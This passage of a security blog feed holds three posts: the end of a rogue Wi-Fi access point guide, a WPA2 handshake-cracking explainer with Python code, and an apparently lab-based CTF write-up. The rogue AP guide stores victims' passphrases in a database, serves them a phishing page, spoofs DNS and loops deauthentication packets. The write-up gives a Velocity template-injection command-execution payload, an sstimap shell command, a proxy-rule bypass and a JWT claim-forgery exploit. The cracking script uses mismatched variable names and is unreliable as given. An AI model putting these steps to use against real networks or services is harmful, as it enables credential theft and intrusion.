bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>mysql&gt; create database rogueap;</div><div class='line'>mysql&gt; create user rogueuser;</div><div class='line'>mysql&gt; grant all on rogueap.* to 'rogueuser'@'localhost' identified by 'roguepassword';</div><div class='line'>mysql&gt; use rogueap;</div><div class='line'>mysql&gt; create table wpa_keys(password1 varchar(30), password2 varchar(30));</div><div class='line'>mysql&gt; ALTER DATABASE rogueap CHARACTER SET 'utf8';</div></code></div></pre><!-- HTML_TAG_END --><p>What exactly happened back in the previous commands in short is:</p><ul><li>A new database is created.</li><li>This database is assigned a user who can write data under the influence of password.</li><li>A data table is created to store the required fields.</li></ul><p>When, the data from a user will be posted to server, whatever will be entered in those fields which we will see how in the subsequent steps, will be saved in this database table. Then after that you can check for table changes:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>mysql&gt; select * from wpa_keys;</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/user-attachments/assets/4308411c-8f65-40ee-8746-639fd2e0f8b4\" alt=\"emptykeys\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><h3 id=\"phishing-site\"><a href=\"#phishing-site\">Phishing Site</a></h3><p>Now, we are required a phishing site, a falsified page or a forged document, basically a web document to induce a user to enter his WiFi passphrase in the document fields. You better want to create your own. But for now, let just download this one:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>wget https://github.com/user-attachments/files/16739611/rogueap.zip</div></code></div></pre><!-- HTML_TAG_END --><p>Extract the zip file which will give you a new folder rogueap.</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>unzip rogueap.zip</div></code></div></pre><!-- HTML_TAG_END --><p>Remove all the current files under /var/www/html and move all rogueap files to this directory</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>rm -rf /var/www/html/*</div><div class='line'>mv rogueap/* /var/www/html/</div></code></div></pre><!-- HTML_TAG_END --><h3 id=\"apache-and-mysql\"><a href=\"#apache-and-mysql\">Apache and MySQL</a></h3><p>Start Apache2 and MySQL Services:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>service apache2 start</div><div class='line'>service mysql start</div></code></div></pre><!-- HTML_TAG_END --><p>The main logic behind password storage is placed under the file dbconnect.php which is by now located under /var/www/html/ directory. Go on and open that file:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>nano /var/www/html/dbconnect.php</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/user-attachments/assets/d7bfc38f-670b-4eaa-a8e9-9e5167166605\" alt=\"database\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>Note, the highlighted fields in the above picture. This is where database credentials are defined. It means if you mess with database configuration, you have to alter this file too or vice virsa.</p><p>Now, just redirect the network traffic to Gateway IP where our forged document is located:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>dnssnoof -i wlan1mon</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/user-attachments/assets/84e840ec-f275-4daa-a715-058c94f1ff79\" alt=\"dnsspoof\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><quote>If until yet everything works, open the link 192.168.1.1 in your browser and see if the document is available. If it is, then try once entering any value in the fields and check in the database terminal if changes are commited.</quote><h3 id=\"deauthentication\"><a href=\"#deauthentication\">Deauthentication</a></h3><p>This is another compliment to this attack. We will forcely disconnect the victims from the real network, so they would connect the forged network. For this, we will create an infinite loop of deauthentication packets for the target network.</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>aireplay-ng -00 -a BD:88:E8:7D:D8:F8 wlan2mon</div></code></div></pre><!-- HTML_TAG_END --><p>Note the paramters:</p><ul><li><code>BD:88:E8:7D:D8:F8</code> MAC Address of target wireless network</li><li><code>wlan2mon: Interface</code> from which to send disconnection packets.</li></ul><p><img src=\"https://github.com/user-attachments/assets/06999138-0a1d-4d46-a3e8-78455c8f800f\" alt=\"aireplay\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>The question arises here. Is it necassery to buy another wireless card to do this? No, you can use the same adapter for this part too. Just make sure that the wireless card doesn‚Äôt change operating channel while dispatching packets which is by default in this case. Well, it‚Äôs not always works. So, it‚Äôs better to use another wireless adapter for this.</p><h3 id=\"credentials\"><a href=\"#credentials\">Credentials</a></h3><p>Let‚Äôs play the victim role. When a victim after deauthentication connects to forged network, he will inevitably put himself into a situation where he will give away his password for the sake of internet usage. Well, as soon he sees our fake page and enter the passphrase in document fields, changes in database will be commited and we will get the password on fly.</p><p>So, come back to MySQL terminal and again check any changes to database:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>mysql&gt; select * from wpa_keys;</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/user-attachments/assets/711722d8-80c5-4448-8baf-273f6ec91923\" alt=\"wpakeys\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>From this we be able to know that the password is p@ssword123.</p><h2 id=\"conclusion\"><a href=\"#conclusion\">Conclusion</a></h2><p>We have seen to setup a fake access point to harvest potential data over the air. At first, we launched the AP base using hostapd, then we assgined the network some IP parameters and added some routing rules for traffic settlement. Then we seen to forward Internet for enhancing the phishing process. And at the end, we setup the Phishing site via apache Web Server and MySQL storage server.</p>","summary":"A detailed guide on how to setup a rogue or fake access point wifi network using hostapdo","image":"https://github.com/user-attachments/assets/471e01a7-df63-414e-9370-6b8deafe6686","date_published":"2024-08-25T00:00:00.000Z","date_modified":"2024-09-14T21:03:45.278Z","tags":null,"_indieweb":{"type":"article"}},{"id":"blog/2023/wpa-hash-cracking-process-explained-in-detal","url":"https://blog.shameerkashif.me/blog/2023/wpa-hash-cracking-process-explained-in-detal","title":"WPA(2) PMKID Hash Cracking (MIC) Process Explained","content_html":"<p><strong>After the discovery of the PMKID hash crack vulnerability, I spent some time understanding the process and WPA/WPA2 protocol &amp; came across this idea to publish how the real hash cracking works. This article is all about how you can build up something like aircrack-ng or coWPAtty or in other words your own cracking tool. Since a lot of articles have been published on the 4-way handshake and how basic MIC cracking works, the aim here is to get to know how things work at the lower level.</strong></p><p>Well, in basic, there are three major keys that we have to compute: </p><ul><li>Pairwise Master Keys (PMK)</li><li>Pairwise Transient Keys (PTK)</li><li>Message Integrity Code (MIC)</li></ul><p>These three of them are computed in the same sequence as given. The idea behind the 4-way handshake is that two connecting stations have to prove that they know the key by not transmitting the actual key. Instead, the key is strongly encrypted and verified on Authenticator‚Äôs (AP) Side. Various functions are used in this process to securely encrypt the passphrase key.</p><h2 id=\"the-handshake-process\"><a href=\"#the-handshake-process\">The Handshake Process</a></h2><p>Before the actual handshake takes place, i.e. EAPOL packets are transmitted, Open authentication and association steps are performed which in short verifies the compatibility of both interconnecting stations. In short, the following happens after successful association: </p><ul><li>ANONCE, a randomly generated value is sent by Access Point to the connecting station.</li><li>The Station then sends SNONCE along with Pairwise Transient Key (PTK) and MIC to AP. While PTK is derived from PMK.</li><li>On receiving the second EAPOL, access point computes Group Transient Key (GTK).</li><li>Lastly, AP sends an acknowledgement to the station which also contains a MIC code.</li></ul><p>From the above process, our main objective is to get the MIC hash. You see, MIC is transmitted at second and fourth step. Tools like aircrack-ng and coWPAtty use the MIC at the fourth step to crack the hash. While here we will look for the second frame MIC.</p><p>Calculating the MIC of the 2nd EAPOL frame can also be more useful, like a half captured handshake can be used in the process. Half handshakes can be captured and further manipulated by hosting a rogue access point. Let‚Äôs come back to where we were.</p><h3 id=\"pml-pairwise-master-key-computation\"><a href=\"#pml-pairwise-master-key-computation\">(PML) Pairwise Master Key Computation</a></h3><p>In sequence we have PMK on the first side. PMK is used to derive PTK and is never sent over the air. instead, the derived PTK is transmitted to AP. PMK is computed using the Password-Based Key Derivation Function 2 (PBKDF2) which uses the HMAC-SHA1 hash algorithm to encode data. In result, a 256-bit hash will be created to this function. Well, in general, we could logically write this up:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>_PMK_ = PBKDF2(SHA1, Pre-Shared-Key, SSID, 4096, 256)</div></code></div></pre><!-- HTML_TAG_END --><p>Where Pre-Shared-Key (PSK) is the actual plaintext password and SSID is used here as a salt for hashing. In the classic sense of Python, we could write:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>#!/usr/bin/python</div><div class='line'>from pbkdf2 import PBKDF2</div><div class='line'></div><div class='line'># Supposing Values Here.</div><div class='line'>ssid = \"shellvoide\"      </div><div class='line'>psk = \"mypassword\"</div><div class='line'></div><div class='line'>pmk = PBKDF2(psk, ssid, 4096).read(32)</div></code></div></pre><!-- HTML_TAG_END --><p>Make sure you have pbkdf2 library in path. Install it using python-pip if you don‚Äôt have it already. </p><h3 id=\"ptk-pairwise-transient-key-computation\"><a href=\"#ptk-pairwise-transient-key-computation\">(PTK) Pairwise Transient Key Computation</a></h3><p>The next hash in sequence is PTK which is transmitted in 2nd EAPOL frame. The construction of PTK is pretty tricky but thanks to stackoverfow from where i found the code. The PTK is dependant on ANONCE, SNONCE, AP MAC, Station MAC and PMK which are first concatenated and must exist in hex form. In result, a 512 bit string will be constructed which is the combination of various other keys. These keys are:</p><ul><li>Key Confirmation Key (KCK): 128 bits.</li><li>Key Encryption Key (KEK): 128 bits.</li><li>Temporal Key (TK): 128 bits.</li><li>MIC Tx: 64 bits.</li><li>MIC Rx: 64 bits.</li></ul><p>While searching on web, i came across two implemenations of the function ‚ÄúPRF512‚Äù which is another pseudo random function for computing PTK. This one worked perfectly: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>def customPRF512(key,A,B):</div><div class='line'>    blen = 64</div><div class='line'>    i    = 0</div><div class='line'>    R    = ''</div><div class='line'>    while i&lt;=((blen*8+159)/160):</div><div class='line'>        hmacsha1 = hmac.new(key,A+chr(0x00)+B+chr(i),hashlib.sha1)</div><div class='line'>        i+=1</div><div class='line'>        R = R+hmacsha1.digest()</div><div class='line'>    return R[:blen]</div></code></div></pre><!-- HTML_TAG_END --><p>And now putting the pieces together: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>from pbkdf2 import PBKDF2</div><div class='line'>import hmac, binascii, hmac, hashlib, sha</div><div class='line'></div><div class='line'>def customPRF512(key,A,B):</div><div class='line'>    blen = 64</div><div class='line'>    i    = 0</div><div class='line'>    R    = ''</div><div class='line'>    while i&lt;=((blen*8+159)/160):</div><div class='line'>        hmacsha1 = hmac.new(key,A+chr(0x00)+B+chr(i),hashlib.sha1)</div><div class='line'>        i+=1</div><div class='line'>        R = R+hmacsha1.digest()</div><div class='line'>    return R[:blen]</div><div class='line'></div><div class='line'>ssid = \"shellvoide\"      </div><div class='line'>psk = \"mypassword\"</div><div class='line'>mac_ap = binascii.unhexlify(\"000ef4ded961\")</div><div class='line'>mac_cl = binascii.unhexlify(\"9840bb444f49\")</div><div class='line'>anonce = binascii.unhexlify(\"26c7a2cf7d9d0657980e9d077562f5ae3f17929a66e870569980dc5fc2fcf238\")</div><div class='line'>cnonce = binascii.unhexlify(\"80ccbcbea79e39b4d88cf43478b19f32649cce78bc4942f4f51ba31207a9f2cf\")</div><div class='line'></div><div class='line'>key_data = min(mac_ap, mac_cl) + max(mac_ap, mac_cl) + min(anonce,snonce) + max(anonce,snonce)</div><div class='line'>pke = \"Pairwise key expansion\"    # Standard Set Value</div><div class='line'></div><div class='line'>pmk = PBKDF2(psk, ssid, 4096).read(32)</div><div class='line'>ptk = customPRF512(pmk, PKE, key_data)</div></code></div></pre><!-- HTML_TAG_END --><h3 id=\"mic-message-integrity-code\"><a href=\"#mic-message-integrity-code\">(MIC) Message Integrity Code</a></h3><p>Until now, we have two of our keys. MIC is a pain in the butt and it took me over a week to figure the right sequence. However, as I‚Äôve already told that the MIC that we are going to compute is the MIC from the second EAPOL. From until to this point and all the previous proceedings, it‚Äôs worth mentioning about this article which helped me a lot to reach this point. Remember that the PTK is the combination of various other keys and the first of them is KCK which will be used as a salt for MIC. </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>HMAC(KCK, payload, MD5/SHA128)</div></code></div></pre><!-- HTML_TAG_END --><p>Where KCK, as you know, can be extracted from PTK and MD5/SHA1 are the hashes which are available through hashlib library. The only thing we are left with is payload. Here, the payload is referred to the whole data captured in the 2nd EAPOL frame. Well, doing it the Python way: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>mic = hmac.new(ptk[0:16], payload, hashlib.md5).hexdigest() #WPA1</div><div class='line'>mic = hmac.new(ptk[0:16], payload, hashlib.sha1).hexdigest() #WPA2</div></code></div></pre><!-- HTML_TAG_END --><p>Let‚Äôs recall the whole script: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>from pbkdf2 import PBKDF2</div><div class='line'>import hmac, binascii, hmac, hashlib, sha</div><div class='line'></div><div class='line'>def customPRF512(key,A,B):</div><div class='line'>    blen = 64</div><div class='line'>    i    = 0</div><div class='line'>    R    = ''</div><div class='line'>    while i&lt;=((blen*8+159)/160):</div><div class='line'>        hmacsha1 = hmac.new(key,A+chr(0x00)+B+chr(i),hashlib.sha1)</div><div class='line'>        i+=1</div><div class='line'>        R = R+hmacsha1.digest()</div><div class='line'>    return R[:blen]</div><div class='line'></div><div class='line'>ssid = \"shellvoide\"      </div><div class='line'>psk = \"mypassword\"</div><div class='line'>mac_ap = binascii.unhexlify(\"000ef4ded961\")</div><div class='line'>mac_cl = binascii.unhexlify(\"9840bb444f49\")</div><div class='line'>anonce = binascii.unhexlify(\"26c7a2cf7d9d0657980e9d077562f5ae3f17929a66e870569980dc5fc2fcf238\")</div><div class='line'>cnonce = binascii.unhexlify(\"80ccbcbea79e39b4d88cf43478b19f32649cce78bc4942f4f51ba31207a9f2cf\")</div><div class='line'></div><div class='line'># Supposing payload. You'll have to extract it.</div><div class='line'>payload = binascii.unhexlify(\"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\")</div><div class='line'></div><div class='line'>key_data = min(mac_ap, mac_cl) + max(mac_ap, mac_cl) + min(anonce,snonce) + max(anonce,snonce)</div><div class='line'>pke = \"Pairwise key expansion\"    # Standard Set Value</div><div class='line'></div><div class='line'>pmk = PBKDF2(psk, ssid, 4096).read(32)</div><div class='line'>ptk = customPRF512(pmk, PKE, key_data)</div><div class='line'>mic = hmac.new(ptk[0:16], payload, hashlib.md5).hexdigest()</div><div class='line'></div><div class='line'>print \"MIC: \"+mic</div></code></div></pre><!-- HTML_TAG_END --><p>If you give everything correctly, this code will produce the MIC and will print in on screen. You can then verify by comparing this MIC from MIC produced by coWPAtty and aircrack. </p><p>As of my understandings, the only thing that‚Äôs probably can cause some issue is step 3 while looking at the payload. If you are writing something on this, you can first go for each hash independently and then bind them together. While implementing the functions, note which version of WPA you are computing MIC for. WPA use MD5 algorithm while WPA2 use SHA1 algorithm. </p>","summary":"A guide on what the MIC is and how the actual WPA(2) cracking happens at lower level","image":"https://github.com/user-attachments/assets/51b06557-0a25-4ddd-a59d-6783add3a447","date_published":"2024-08-25T00:00:00.000Z","date_modified":"2024-09-14T21:03:45.282Z","tags":["wireless","wpa-wpa2","wifi"],"_indieweb":{"type":"article"}},{"id":"blog/2023/htb-cyber-apocalypse-ctf-2024-web-writeups","url":"https://blog.shameerkashif.me/blog/2023/htb-cyber-apocalypse-ctf-2024-web-writeups","title":"Writeups for Web challenges from HTB Cyber Apocalypse CTF 2024","content_html":"<p>We just finished playing the HTB Cyber Apocalypse 2024. It was real fun. I wasn‚Äôt able to mainly solve 2 of the hard challenges. Neverthless, it was real fun and just like every other time, got new things to learn. I mainly focused on web and tried one challenge from Misc which i wasn‚Äôt able to solve. Anyhow, the writeups for some of the interesting web one‚Äôs that i sovled. </p><h2 id=\"web\"><a href=\"#web\">WEB</a></h2><h3 id=\"labyrinth-linguist---easy\"><a href=\"#labyrinth-linguist---easy\">Labyrinth Linguist - Easy</a></h3><p>I reviewed whole code. First thing i noticed is the use of <code>velocity</code> template engine in the application. Moreover, the version that was specified for usage was <code>1.7</code>:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" xml=\"true\"><div class=\"language-id\">xml</div><div class='code-container'><code><div class='line'>&lt;dependencies&gt;</div><div class='line'>  &lt;dependency&gt;</div><div class='line'>    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</div><div class='line'>    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</div><div class='line'>  &lt;/dependency&gt;</div><div class='line'>  &lt;dependency&gt;</div><div class='line'>    &lt;groupId&gt;org.apache.velocity&lt;/groupId&gt;</div><div class='line'>    &lt;artifactId&gt;velocity&lt;/artifactId&gt;</div><div class='line'>    &lt;version&gt;1.7&lt;/version&gt;</div><div class='line'>  &lt;/dependency&gt;</div><div class='line'>  &lt;dependency&gt;</div><div class='line'>    &lt;groupId&gt;org.apache.velocity&lt;/groupId&gt;</div><div class='line'>    &lt;artifactId&gt;velocity&lt;/artifactId&gt;</div><div class='line'>    &lt;version&gt;1.7&lt;/version&gt;</div><div class='line'>  &lt;/dependency&gt;</div><div class='line'>&lt;/dependencies&gt;</div></code></div></pre><!-- HTML_TAG_END --><p>The specified version was quite an outdated version of the library. Now, first thing i did was try to read the code and look for any SSTIs. </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" java=\"true\"><div class=\"language-id\">java</div><div class='code-container'><code><div class='line'>public static String readFileToString(String filePath, String replacement) throws IOException &#123;</div><div class='line'>    StringBuilder content = new StringBuilder();</div><div class='line'>    BufferedReader bufferedReader = null;</div><div class='line'></div><div class='line'>    try &#123;</div><div class='line'>        bufferedReader = new BufferedReader(new FileReader(filePath));</div><div class='line'>        String line;</div><div class='line'>        </div><div class='line'>        while ((line = bufferedReader.readLine()) != null) &#123;</div><div class='line'>            line = line.replace(\"TEXT\", replacement);</div><div class='line'>            content.append(line);</div><div class='line'>            content.append(\"&#92;n\");</div><div class='line'>        &#125;</div><div class='line'>    &#125; finally &#123;</div><div class='line'>        if (bufferedReader != null) &#123;</div><div class='line'>            try &#123;</div><div class='line'>                bufferedReader.close();</div><div class='line'>            &#125; catch (IOException e) &#123;</div><div class='line'>                e.printStackTrace();</div><div class='line'>            &#125;</div><div class='line'>        &#125;</div><div class='line'>    &#125;</div><div class='line'></div><div class='line'>    return content.toString();</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><p>So, we definitely are replacing the the word <code>TEXT</code> with the our input. And later on this code was processed here: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" java=\"true\"><div class=\"language-id\">java</div><div class='code-container'><code><div class='line'>org.apache.velocity.Template t = new org.apache.velocity.Template();</div><div class='line'>t.setRuntimeServices(runtimeServices);</div><div class='line'>try &#123;</div><div class='line'></div><div class='line'>  t.setData(runtimeServices.parse(reader, \"home\"));</div><div class='line'>  t.initDocument();</div><div class='line'>  VelocityContext context = new VelocityContext();</div><div class='line'>  context.put(\"name\", \"World\");</div><div class='line'></div><div class='line'>  StringWriter writer = new StringWriter();</div><div class='line'>  t.merge(context, writer);</div><div class='line'>  template = writer.toString();</div><div class='line'></div><div class='line'>&#125; catch (ParseException e) &#123;</div><div class='line'>  e.printStackTrace();</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><p>At first i confirmed the injection by providing the <code>$name</code> value to the <code>text</code> parameter and it replaced it with <code>world</code>. Now, doing a bit of googling, i discovered a <code>CVE</code> for this specific version of <code>Velocity</code>.I used the following payload with the name param</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>#set($e=\"e\");$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"whoami\")</div></code></div></pre><!-- HTML_TAG_END --><p>I used curl to execute the payload and got the right execution: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>curl.exe 'http://94.237.49.166:35229/' -X POST --data-raw 'text=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22whoami%22)'</div></code></div></pre><!-- HTML_TAG_END --><p>However, i had a hard time getting the flag since i wasn‚Äôt able to get a reverse shell or place some special characters in the command. This seemed like a dead end for a second. But then i fired up <code>sstimap</code> against it.And to my surprise i was able to get an OS Shell directly without having to do the CVE exploit: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>python3 sstimap.py --url http://94.237.49.166:35229/ -f --os-shell --engine velocity</div></code></div></pre><!-- HTML_TAG_END --><p>Get the flag</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>cat /flag*</div></code></div></pre><!-- HTML_TAG_END --><h3 id=\"locktalk\"><a href=\"#locktalk\">LockTalk</a></h3><p>It was a flask application with haproxy in front of the application. Reviewing the code, i found 3 APIs that i can request: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>@api_blueprint.route('/get_ticket', methods=['GET'])</div><div class='line'>def get_ticket():</div><div class='line'></div><div class='line'>    claims = &#123;</div><div class='line'>        \"role\": \"guest\", </div><div class='line'>        \"user\": \"guest_user\"</div><div class='line'>    &#125;</div><div class='line'>    </div><div class='line'>    token = jwt.generate_jwt(claims, current_app.config.get('JWT_SECRET_KEY'), 'PS256', datetime.timedelta(minutes=60))</div><div class='line'>    return jsonify(&#123;'ticket: ': token&#125;)</div><div class='line'></div><div class='line'></div><div class='line'>@api_blueprint.route('/chat/&lt;int:chat_id&gt;', methods=['GET'])</div><div class='line'>@authorize_roles(['guest', 'administrator'])</div><div class='line'>def chat(chat_id):</div><div class='line'>  ...</div><div class='line'></div><div class='line'>@api_blueprint.route('/flag', methods=['GET'])</div><div class='line'>@authorize_roles(['administrator'])</div><div class='line'>def flag():</div><div class='line'>    return jsonify(&#123;'message': current_app.config.get('FLAG')&#125;), 200</div></code></div></pre><!-- HTML_TAG_END --><p>The goal here is to generate a ticket and somehow modify the claim so that the role we use is of administrator. However, we can‚Äôt simply request the <code>/get_ticket</code> api because of <code>haproxy</code>: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>global</div><div class='line'>    daemon</div><div class='line'>    maxconn 256</div><div class='line'></div><div class='line'>defaults</div><div class='line'>    mode http</div><div class='line'></div><div class='line'>    timeout connect 5000ms</div><div class='line'>    timeout client 50000ms</div><div class='line'>    timeout server 50000ms</div><div class='line'></div><div class='line'>frontend haproxy</div><div class='line'>    bind 0.0.0.0:1337</div><div class='line'>    default_backend backend</div><div class='line'></div><div class='line'>    http-request deny if &#123; path_beg,url_dec -i /api/v1/get_ticket &#125;</div><div class='line'>    </div><div class='line'>backend backend</div><div class='line'>    balance roundrobin</div><div class='line'>    server s1 0.0.0.0:5000 maxconn 32 check</div></code></div></pre><!-- HTML_TAG_END --><p>I bypassed the filter rule with the simple listing: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>curl http://localhost:1337/../api/v1/get_ticket -i --path-as-is</div></code></div></pre><!-- HTML_TAG_END --><p>The above returned me with the <code>JWT</code> token needed. </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNDc1MTksImlhdCI6MTcxMDE0MzkxOSwianRpIjoiYmQtcW5GYnBqcUhpbEFSeXN5aGwyUSIsIm5iZiI6MTcxMDE0MzkxOSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.s569WtLjeq3NQSI9GXVDfTYJSUrxdEGtCBnxjHnwEa6UWwS6RNfLF-qMjvAc-GiqHzG1Wx1SQd1tsqIqnIF6zz9zXFQaSimFgnYE0HvUwaI_XhzBJA-ZxmrgetgJjbOhKBOopKIXmtUt-LPE2tsB3yr6SJe-C2RvFlTzrgQMDrOtRBJJiXfYne1QI4nnXUFY0XsNXCpKQIe6ELHNmeE-F6Fj5s1AJwUEBwWJNVnmw_s5mVbL1hvIE54e2mJg5VK8PfCLXx4u-ghVRgGDRkUza4UpgM8nrSmTj5d40iREyz9M6PDvi0TFhuVvlQStrpz0UId-uyL4-Vwp9UnTOSNBRA</div></code></div></pre><!-- HTML_TAG_END --><p>Now, checking the requirements of project, i found <code>python_jwt==3.3.3</code>:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>uwsgi</div><div class='line'>Flask</div><div class='line'>requests</div><div class='line'>python_jwt==3.3.3</div></code></div></pre><!-- HTML_TAG_END --><p>Heading to google, i found a security advisory of the project on Github: <a href=\"https://github.com/davedoesdev/python-jwt/security/advisories/GHSA-5p8v-58qm-c7fp\" rel=\"nofollow noopener noreferrer external\" target=\"_blank\">https://github.com/davedoesdev/python-jwt/security/advisories/GHSA-5p8v-58qm-c7fp</a></p><p>It seems as if i can modify the claims of the JWT for versions <code>&lt;3.3.4</code></p><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/758bd543-0d9a-4543-a1a1-7d7f43cb4fb8\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>In one of the commits of the repo of fixing this issue i found a code that i the modified to write my own exploit. Make sure to replace the token in the <code>create</code> method:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>from datetime import timedelta</div><div class='line'>from json import loads, dumps</div><div class='line'>import python_jwt as jwt</div><div class='line'>from pyvows import Vows, expect</div><div class='line'>from jwcrypto.common import base64url_decode, base64url_encode</div><div class='line'>from pprint import pprint</div><div class='line'></div><div class='line'>class ForgedClaims:</div><div class='line'>    def create(self):</div><div class='line'>        \"\"\" Generate token \"\"\"</div><div class='line'>        # payload = &#123;'sub': 'alice'&#125;</div><div class='line'>        token = \"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNDc1MTksImlhdCI6MTcxMDE0MzkxOSwianRpIjoiYmQtcW5GYnBqcUhpbEFSeXN5aGwyUSIsIm5iZiI6MTcxMDE0MzkxOSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.s569WtLjeq3NQSI9GXVDfTYJSUrxdEGtCBnxjHnwEa6UWwS6RNfLF-qMjvAc-GiqHzG1Wx1SQd1tsqIqnIF6zz9zXFQaSimFgnYE0HvUwaI_XhzBJA-ZxmrgetgJjbOhKBOopKIXmtUt-LPE2tsB3yr6SJe-C2RvFlTzrgQMDrOtRBJJiXfYne1QI4nnXUFY0XsNXCpKQIe6ELHNmeE-F6Fj5s1AJwUEBwWJNVnmw_s5mVbL1hvIE54e2mJg5VK8PfCLXx4u-ghVRgGDRkUza4UpgM8nrSmTj5d40iREyz9M6PDvi0TFhuVvlQStrpz0UId-uyL4-Vwp9UnTOSNBRA\"</div><div class='line'>        return token</div><div class='line'></div><div class='line'>    def topic(self, topic):</div><div class='line'>        \"\"\" Use mix of JSON and compact format to insert forged claims including long expiration \"\"\"</div><div class='line'>        [header, payload, signature] = topic.split('.')</div><div class='line'>        parsed_payload = loads(base64url_decode(payload))</div><div class='line'>        print(parsed_payload)</div><div class='line'>        parsed_payload['role'] = 'administrator'</div><div class='line'>        parsed_payload['user'] = 'admin_user'</div><div class='line'>        print(parsed_payload)</div><div class='line'>        # parsed_payload['exp'] = 2000000000</div><div class='line'>        fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))</div><div class='line'>        return '&#123;\"  ' + header + '.' + fake_payload + '.\":\"\",\"protected\":\"' + header + '\", \"payload\":\"' + payload + '\",\"signature\":\"' + signature + '\"&#125;'</div><div class='line'></div><div class='line'>claime__ = ForgedClaims()</div><div class='line'>jwt = claime__.create()</div><div class='line'>print(claime__.topic(jwt))</div></code></div></pre><!-- HTML_TAG_END --><p>I ran the code and got the following payload: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>&#123;\"  